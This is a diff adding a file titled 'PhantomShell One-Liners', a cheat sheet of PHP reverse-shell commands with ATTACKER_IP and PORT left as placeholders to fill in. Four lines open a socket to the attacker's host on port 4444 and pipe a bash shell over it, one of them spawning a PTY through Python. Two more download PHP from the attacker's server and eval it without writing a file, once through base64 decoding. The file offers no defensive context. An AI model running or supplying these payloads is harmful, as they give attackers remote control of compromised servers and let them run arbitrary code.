@@ -1,0 +1,20 @@
+# PhantomShell One-Liners
+# Replace ATTACKER_IP and PORT with your values
+
+# PHP proc_open
+php -r '$s=fsockopen("ATTACKER_IP",4444);$p=proc_open("/bin/bash",array(0=>$s,1=>$s,2=>$s),$x);'
+
+# PHP exec
+php -r '$s=fsockopen("ATTACKER_IP",4444);while(!feof($s)){$c=fgets($s);$o=shell_exec($c);fwrite($s,$o);}'
+
+# PHP popen
+php -r '$s=fsockopen("ATTACKER_IP",4444);while(1){$c=fgets($s);$p=popen($c,"r");while(!feof($p))fwrite($s,fread($p,1024));pclose($p);}'
+
+# PHP with PTY (if python available)
+php -r '$s=fsockopen("ATTACKER_IP",4444);$d=array(0=>$s,1=>$s,2=>$s);$p=proc_open("python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\"" ,$d,$pp);'
+
+# Fetch and execute (no file on disk)
+php -r 'eval(file_get_contents("http://ATTACKER_IP:8888/phantom.php"));'
+
+# Base64 encoded fetch
+php -r 'eval(base64_decode(file_get_contents("http://ATTACKER_IP:8888/b64payload")));'
